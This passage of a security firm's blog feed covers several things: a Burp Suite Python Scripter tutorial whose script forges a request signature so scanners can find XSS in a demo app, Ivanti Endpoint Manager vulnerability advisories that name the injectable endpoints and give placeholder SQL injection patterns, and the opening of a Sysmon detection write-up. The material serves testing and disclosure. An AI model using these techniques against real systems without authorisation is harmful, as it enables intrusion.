messageInfo.setRequest(newreq_bytes)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;POST Request:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;newreq_bytes = helpers.buildHttpMessage(headers,output_body)
messageInfo.setRequest(newreq_bytes)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Putting it together with the previous code an example GET request where we want to base64 encode an input we could use the following code.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;import re
import base64

if messageIsRequest:
	reqbytes = messageInfo.getRequest()
	req = helpers.bytesToString(reqbytes)
	
	input_val = re.findall(r&amp;#39;input=[^\s]*&amp;#39;, req)[0].split(&amp;#39;&amp;amp;&amp;#39;)[0].split(&amp;#39;=&amp;#39;)[1]
	output_val = base64.b64encode(input_val)
	
	output_param = r&amp;#39;input=%s&amp;#39; % (output_val)
	output_req = req.replace(input_param, output_param)
	
	newreq = helpers.stringToBytes(output_req)
	messageInfo.setRequest(newreq)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;There isn’t really much more required to use the extension and whilst there is a lot more that can be done with it, this blog is only intended to help understand how to get started with it by providing some basic usage examples. In the final section of this blog, I’ve added an example showing how to use it to bypass a simple request signing implementation.&lt;/p&gt;
&lt;h3&gt;Practical Example – Message Request Signing&lt;span class=&#34;absolute -mt-20&#34; id=&#34;practical-example--message-request-signing&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#practical-example--message-request-signing&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;As I mentioned previously, Burp is now smart enough to recognise the base64 encoded input and inject payloads into the body before its encoded – the original reason I had for using the extension. However, there are a number of potential use cases for the extension. As such, I thought I’d provide an example of another use for it.&lt;/p&gt;
&lt;p&gt;Another penetration test I conducted featured an application that implemented request signing, where every request sent to the server sent a signature generated from the request. As the signing was carried out by client-side code, it was possible to review the implementation and sign any request we make to the server. However, the signature would break a lot of Burp functionality, including the active scanner, as this isn’t automatically updated for every new request. To overcome this, once the signing implementation is understood, we can then use the Python Scripter extension to carry out the signing process on each request that Burp processes.&lt;/p&gt;
&lt;p&gt;As an example, I’ve created a very basic PHP web app that simply takes a base64 JSON encoded string containing two user input values and reflects those inputs in the web response. The application also requires a “Signature” header to be sent which contains a SHA256 hash of the length of the body of the POST request. This application is obviously vulnerable to reflected cross-site scripting, but if we try to use Burp’s active scanner to identify this it will fail. This happens as the request signature isn’t updated when fuzzing with XSS payloads, so Burp won’t detect the payloads in the response.&lt;/p&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/pyscripter_5a-1.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Simple PHP web app vulnerable to cross-site scripting.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/pyscripter_5b.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Base64 string sent as input along with the signature header. Input is reflected in the web response&lt;/strong&gt;&lt;/em&gt;.&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/pyscripter_5c-1.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Using&lt;/em&gt; B_urp&amp;rsquo;s_ a_ctive scanner fails to pick up any cross-site scripting issues_&lt;/strong&gt;&lt;em&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;We want our python script to do a number of things including:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Extract two input values (input1 and input2) from the starting request.&lt;/li&gt;
&lt;li&gt;Format them in to a JSON request body.&lt;/li&gt;
&lt;li&gt;Base64 encode the JSON request body.&lt;/li&gt;
&lt;li&gt;Use the base64 encoded value as the value of the input parameter.&lt;/li&gt;
&lt;li&gt;Create a SHA256 hash of the length of the POST request body.&lt;/li&gt;
&lt;li&gt;Add the hash as a HTTP request header.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The following snippet of python code can be used to carry out all of this. We can then copy this into the extension script window, and it will automatically update a basic request with input1 and input2 parameters to the desired format. This will happen for all requests Burp Suite processes including those generated by functionality such as the active scanner, meaning the scanner should now pick up any vulnerabilities.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;import re
import base64
import hashlib

if messageIsRequest:
	reqbytes = messageInfo.getRequest()
	req = helpers.analyzeRequest(reqbytes)
	parameters = reqbytes[(req.getBodyOffset()):].tostring()
	headers = req.getHeaders()

	val_1 = re.findall(r&amp;#39;input1=[^\s]*&amp;#39;, parameters)[0].split(&amp;#39;&amp;amp;&amp;#39;)[0].split(&amp;#39;=&amp;#39;)[1]
	val_2 = re.findall(r&amp;#39;input2=[^\s]*&amp;#39;, parameters)[0].split(&amp;#39;&amp;amp;&amp;#39;)[0].split(&amp;#39;=&amp;#39;)[1]
	
	input_val = &amp;#39;{&amp;#34;input1&amp;#34;:&amp;#34;%s&amp;#34;,&amp;#34;input2&amp;#34;:&amp;#34;%s&amp;#34;}&amp;#39; % (val_1, val_2)
	base64_val = base64.b64encode(input_val)
	output_body = r&amp;#39;input=%s&amp;#39; % base64_val
	
	hash_body_len = hashlib.sha256(str(len(output_body)).encode(&amp;#39;utf-8&amp;#39;)).hexdigest()
	sig = &amp;#34;Signature: &amp;#34; &amp;#43; hash_body_len
	headers.add(sig)
	
	newreq = helpers.buildHttpMessage(headers, output_body)
	messageInfo.setRequest(newreq)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/pyscripter_5e.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;With the script, we can now send a valid request without the signature and without the base64 encoding.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/pyscripter_5f.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Using logger++ we can see that the script automatically modifies the request and adds the signature as well as converts the input into a base64 encoded string.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/pyscripter_5g.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Now if we active scan the request the scanner will instantly pick up cross-site scripting vulnerabilities.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;h3&gt;Conclusion&lt;span class=&#34;absolute -mt-20&#34; id=&#34;conclusion&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#conclusion&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;There are a vast number of potential use cases for the Python Scripter extension when conducting testing using Burp Suite Professional. In particular, it is useful for any scenario where client-side code disrupts the function of automated tools by heavily modifying user input or the request before it is sent to the server. Some potential examples include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Encoding / encrypting user input (where keys and algorithms are known)&lt;/li&gt;
&lt;li&gt;HTTP request signature algorithms&lt;/li&gt;
&lt;li&gt;Weak captcha implementations&lt;/li&gt;
&lt;li&gt;Functionality which requires a unique value per request to the server&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;By following the processes outlined in this blog, you should be able to write your own Python scripts which can be executed on any request sent through Burp Suite and use this to overcome application specific complications that interfere with automated testing tools.&lt;/p&gt;
&lt;p&gt;Sample scripts for using the Python Scripter extension can be found at the JumpsecLabs GitHub repository [&lt;a href=&#34;https://github.com/JumpsecLabs/python-burp&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;5&lt;/a&gt;].&lt;/p&gt;
&lt;h3&gt;References&lt;span class=&#34;absolute -mt-20&#34; id=&#34;references&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#references&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;[1] &lt;a href=&#34;https://portswigger.net/bappstore/eb563ada801346e6bdb7a7d7c5c52583&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://portswigger.net/bappstore/eb563ada801346e6bdb7a7d7c5c52583&lt;/a&gt;&lt;br&gt;
[2] &lt;a href=&#34;https://github.com/lanmaster53/pyscripter-er&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/lanmaster53/pyscripter-er&lt;/a&gt;&lt;br&gt;
[3] &lt;a href=&#34;https://portswigger.net/bappstore/470b7057b86f41c396a97903377f3d81&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://portswigger.net/bappstore/470b7057b86f41c396a97903377f3d81&lt;/a&gt;&lt;br&gt;
[4] &lt;a href=&#34;https://portswigger.net/burp/extender/api/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://portswigger.net/burp/extender/api/&lt;/a&gt;&lt;br&gt;
[5] &lt;a href=&#34;https://github.com/JumpsecLabs/python-burp&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/JumpsecLabs/python-burp&lt;/a&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Win a place @HackFu 2021 Community Edition!</title>
      <link>//localhost:1313/articles/2020/12/2020-12-21-win-a-place-hackfu-2021-community-edition/</link>
      <pubDate>Mon, 21 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/12/2020-12-21-win-a-place-hackfu-2021-community-edition/</guid>
      <description>
        
        
        &lt;p&gt;Hello world!&lt;br&gt;
At JUMPSEC we’ve managed to get our hands on tickets to what is probably the greatest cyber security event in the calendar, HackFu!&lt;br&gt;
In order to be in with a chance of winning you simply need to complete the following challenge which you can download here (the download contains all the information needed to complete the challenge):&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://drive.google.com/file/d/1WFU23lFzGtxW4U5_FPzlbM4auHSZTiGt/view?usp=sharing&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://drive.google.com/file/d/1WFU23lFzGtxW4U5_FPzlbM4auHSZTiGt/view?usp=sharing&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The deadline for submissions is 6th January 2021, we will announce the lucky winner on 8th January 2021. You don&amp;rsquo;t need to but feel free to add a bit of detail on your submission - we love hearing about the creative ways in which people solve our challenges.&lt;br&gt;
In order to be eligible to win a HackFu ticket you must be able to attend HackFu on Friday 29th January 2021 between 09:30 and 17:30 GMT (it is an online event due to the global pandemic) and you must be at least 18 years old.&lt;br&gt;
If you are the lucky winner we will request a postal address from you so that you can receive your HackFu survival pack which is necessary to participate.&lt;br&gt;
If you’re not eligible to win the tickets or are unable to attend then you are still very welcome to have a go at the challenge and even to submit your answers or ask us for some help if you get stuck - just let us know not to enter you into the prize draw.&lt;/p&gt;
&lt;p&gt;You can find out more about, and buy tickets for, HackFu here:&lt;br&gt;
&lt;a href=&#34;https://chronyko.com/services/hackfu-community-edition/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://chronyko.com/services/hackfu-community-edition/&lt;/a&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory CVE-2020-13769 – Ivanti Unified Endpoint Manager SQL injection</title>
      <link>//localhost:1313/articles/2020/11/2020-11-13-advisory-cve-2020-13769-ivanti-uem-sql-injection/</link>
      <pubDate>Fri, 13 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/11/2020-11-13-advisory-cve-2020-13769-ivanti-uem-sql-injection/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: Ivanti Endpoint Manager&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2020.1; &amp;lt;= 2019.1.3&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://www.ivanti.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;www.ivanti.com&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: CVE-2020-13769&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 13/11/2020&lt;br&gt;
&lt;strong&gt;CVSS 3.1 Score&lt;/strong&gt;: 7.4 - &lt;a href=&#34;https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L&amp;amp;version=3.1&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: Remote, authenticated&lt;br&gt;
&lt;strong&gt;Credits&lt;/strong&gt;: Andrei Constantin Scutariu, Lenk Ratchakrit, Calvin Yau&lt;/p&gt;
&lt;p&gt;Summary&lt;/p&gt;
&lt;p&gt;A number of web components in Endpoint Manager do not properly sanitize user input when executing SQL queries, leaving the application vulnerable to injection attacks towards the underlying database.&lt;br&gt;
On a standard installation with default options, the account used to query the database is database administrator.&lt;/p&gt;
&lt;p&gt;Solution&lt;/p&gt;
&lt;p&gt;The issue has been successfully resolved by the vendor in version 2020.1.1. Customers can install the latest available software update to fix the vulnerability. The vendor also reported this has also been fixed in version 2019.1.4, although this has not been verified by JUMPSEC.&lt;/p&gt;
&lt;p&gt;Technical details&lt;/p&gt;
&lt;p&gt;The following endpoints and parameters are vulnerable and exploitable by any authenticated user:&lt;/p&gt;
&lt;p&gt;POST /LDMS/alert_log.aspx?d=alert_log&amp;amp;tb=serverAlertLog.tb&lt;br&gt;
&amp;ldquo;filterValue&amp;rdquo; parameter&lt;br&gt;
Type: Stacked, time-based blind, boolean-based blind&lt;br&gt;
Example: filterValue=&amp;rsquo;;injection_query_here&amp;ndash;&lt;/p&gt;
&lt;p&gt;POST /remotecontrolauth/api/device&lt;br&gt;
&amp;ldquo;global&amp;rdquo;, &amp;ldquo;displayname&amp;rdquo;, &amp;ldquo;ipaddress&amp;rdquo;, &amp;ldquo;owner&amp;rdquo; parameters&lt;br&gt;
Type: Time-based blind, boolean-based blind&lt;br&gt;
Example: &amp;ldquo;global&amp;rdquo;:&amp;quot;&amp;rsquo;+(injection_query_here)+&amp;rsquo;&amp;quot;&lt;br&gt;
This instance also requires a valid &amp;ldquo;sessionid&amp;rdquo; in the request.&lt;/p&gt;
&lt;p&gt;Timeline&lt;/p&gt;
&lt;p&gt;15/04/2020: Issue reported to the vendor&lt;br&gt;
16/04/2020: Vendor acknowledged the issues&lt;br&gt;
02/06/2020: CVE number assigned from MITRE&lt;br&gt;
13/07/2020: 90 days notice period for disclosure given to the vendor&lt;br&gt;
13/11/2020: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory CVE-2020-13772 - Ivanti Unified Endpoint Manager system information disclosure</title>
      <link>//localhost:1313/articles/2020/11/2020-11-13-cve-2020-13772-ivanti-uem-system-information-disclosure/</link>
      <pubDate>Fri, 13 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/11/2020-11-13-cve-2020-13772-ivanti-uem-system-information-disclosure/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: Ivanti Endpoint Manager&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2020.1.1&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://www.ivanti.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;www.ivanti.com&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: CVE-2020-13772&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 13/11/2020&lt;br&gt;
&lt;strong&gt;CVSS 3.1 Score&lt;/strong&gt;: 5.3 - &lt;a href=&#34;https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N&amp;amp;version=3.1&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: Remote, unauthenticated&lt;br&gt;
&lt;strong&gt;Credits&lt;/strong&gt;: Andrei Constantin Scutariu, Lenk Ratchakrit, Calvin Yau&lt;/p&gt;
&lt;p&gt;Summary&lt;/p&gt;
&lt;p&gt;Ivanti Unified Endpoint Manager&amp;rsquo;s &amp;ldquo;ldcient&amp;rdquo; component expose information about the system that could be used in further attacks against the system.&lt;/p&gt;
&lt;p&gt;Mitigation&lt;/p&gt;
&lt;p&gt;There is currently no fix for this issue. The vendor has yet to release a patch to address the vulnerability; it is advised to review the host configuration and monitor for suspicious activity. If possible, consider disabling or whitelisting access to the affected URLs.&lt;/p&gt;
&lt;p&gt;Technical details&lt;/p&gt;
&lt;p&gt;The following endpoint expose information about the system, such as environment variables, domain name, internal paths and CPU information:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/ldclient/ldprov.cgi, HTTP 9595&lt;/li&gt;
&lt;li&gt;/ldclient/ldprov.cgi, HTTPS 9594&lt;/li&gt;
&lt;li&gt;/ldclient/ldprov.cgi, HTTPS 9593&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Timeline&lt;/p&gt;
&lt;p&gt;15/04/2020: Issue reported to the vendor&lt;br&gt;
16/04/2020: Vendor acknowledged the issues&lt;br&gt;
02/06/2020: CVE number assigned from MITRE&lt;br&gt;
13/07/2020: 90 days notice period for disclosure given to the vendor&lt;br&gt;
13/11/2020: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory CVE-2020-13773 - Ivanti Unified Endpoint Manager Reflected XSS</title>
      <link>//localhost:1313/articles/2020/11/2020-11-13-cve-2020-13773-ivanti-uem-reflected-xss/</link>
      <pubDate>Fri, 13 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/11/2020-11-13-cve-2020-13773-ivanti-uem-reflected-xss/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: Ivanti Endpoint Manager&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2020.1.1&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://www.ivanti.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;www.ivanti.com&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: CVE-2020-13773&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 13/11/2020&lt;br&gt;
&lt;strong&gt;CVSS 3.1 Score&lt;/strong&gt;: 5.5 - &lt;a href=&#34;https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L&amp;amp;version=3.1&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: Remote, authenticated&lt;br&gt;
&lt;strong&gt;Credits&lt;/strong&gt;: Andrei Constantin Scutariu, Lenk Ratchakrit, Calvin Yau&lt;/p&gt;
&lt;p&gt;Summary&lt;/p&gt;
&lt;p&gt;Various web pages on Ivanti Unified Endpoint Manager web management console lack proper input validation on parameters passed in HTTP request, leaving the application vulnerable to client-side attacks. An attacker able to cause the victim to open a malicious URL would obtain javascript code execution on the victim&amp;rsquo;s browser and potentially be able to obtain sensitive information and execute actions on their behalf.&lt;/p&gt;
&lt;p&gt;Mitigation&lt;/p&gt;
&lt;p&gt;There is currently no fix for this issue. The vendor has yet to release a patch to address the vulnerability; it is advised to review the host configuration and monitor for suspicious activity.&lt;/p&gt;
&lt;p&gt;Technical details&lt;/p&gt;
&lt;p&gt;The following endpoints and parameter are vulnerable:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/LDMS/frm_splitfrm.aspx &amp;ldquo;top&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/frm_splitfrm.aspx &amp;ldquo;ttb&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/frm_splitfrm.aspx &amp;ldquo;splittf&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/licensecheck.aspx &amp;ldquo;doc&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/frm_splitcollapse.aspx &amp;ldquo;bottom&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/alert_log.aspx &amp;ldquo;sortdir&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/alert_log.aspx &amp;ldquo;sortcol&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/ServerList.aspx &amp;ldquo;sortdir&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/frm_coremainfrm.aspx &amp;ldquo;bfn&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/frm_findfrm.aspx &amp;ldquo;m&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/frm_taskfrm.aspx any parameter&lt;/li&gt;
&lt;li&gt;/LDMS/query_browsecomp.aspx &amp;ldquo;t&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/sm_actionfrm.asp &amp;ldquo;bfn&amp;rdquo; parameter&lt;/li&gt;
&lt;li&gt;/LDMS/sm_actionfrm.asp &amp;ldquo;d&amp;rdquo; parameter&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Timeline&lt;/p&gt;
&lt;p&gt;15/04/2020: Issue reported to the vendor&lt;br&gt;
16/04/2020: Vendor acknowledged the issues&lt;br&gt;
02/06/2020: CVE number assigned from MITRE&lt;br&gt;
13/07/2020: 90 days notice period for disclosure given to the vendor&lt;br&gt;
13/11/2020: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Detecting known DLL hijacking and named pipe token impersonation attacks with Sysmon</title>
      <link>//localhost:1313/articles/2020/11/2020-11-13-detecting-known-dll-hijacking-and-named-pipe-token-impersonation-attacks-with-sysmon/</link>
      <pubDate>Fri, 13 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/11/2020-11-13-detecting-known-dll-hijacking-and-named-pipe-token-impersonation-attacks-with-sysmon/</guid>
      <description>
        
        
        &lt;p&gt;Background&lt;/p&gt;
&lt;p&gt;Recently we posted a bunch of &lt;a href=&#34;https://labs.jumpsec.com/tag/ivanti/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;advisories&lt;/a&gt; relating to Ivanti Unified Endpoint Manager, a couple of which are for vulnerabilities which can be used to achieve local privilege escalation.&lt;/p&gt;
&lt;p&gt;At JUMPSEC, whenever we find a new vulnerability, we like to challenge ourselves to write rules to detect it being exploited. We learn a lot doing this, it’s kind of fun tweaking the exploit to try and evade detection and really challenges us to write good detection rulesets.&lt;/p&gt;
&lt;p&gt;Naturally, with the right signatures you can detect future exploitation of an issue, but it’s also fun/scary (delete as appropriate!) to run this on historical data and find out if someone else got there first and the vulnerability has been exploited in the wild already…&lt;/p&gt;
&lt;p&gt;We enjoy doing it, we know it is valuable to our clients and we’d love to see more of it being done which is why we’re making an effort to share some detail relating to our recent Ivanti advisories.&lt;/p&gt;
&lt;p&gt;Introduction&lt;/p&gt;
&lt;p&gt;Because of the high number of components that make up an operating system, attackers with local access have a very wide array of possible ways to interact with the system in malicious ways, even when limited to low privileges. This corresponds to a greater effort required to properly monitor for suspicious behaviour and detect attacks.&lt;/p&gt;
&lt;p&gt;In light of the recent vulnerabilities affecting Ivanti Unified Endpoint Manager we want to briefly touch on how it is possible to detect local privilege escalation attack, specifically addressing &lt;a href=&#34;https://labs.jumpsec.com/advisory-cve-2020-13770-ivanti-uem-named-pipe-token-impersonation/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2020-13770&lt;/a&gt; and &lt;a href=&#34;https://labs.jumpsec.com/advisory-cve-2020-13771-ivanti-uem-dll-hijacking/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2020-13771&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;You have probably heard of Sysmon already, but in case you have not, it is a handy tool available in the Windows Sysinternals toolsuite which can track, record and store detailed system events. These events can then be viewed within Windows Event Viewer, and are usually collected by SIEM software for aggregation and analysis.&lt;/p&gt;
&lt;p&gt;We’re focused on Sysmon in this writeup.&lt;/p&gt;
&lt;p&gt;Technical details&lt;/p&gt;
&lt;p&gt;In this section we give a brief explanation of the vulnerabilities and an example of Sysmon configuration rules to log exploitation attempts, along with the rationale behind them so you can adapt them to your existing configuration if needed. These will act as a solid first point of detection, and while the events thereby generated will be by themselves a confident indicator for malicious activity, they can be further correlated with other events for even more precise monitoring.&lt;/p&gt;
&lt;p&gt;CVE-2020-13771 - DLL search order hijacking&lt;/p&gt;
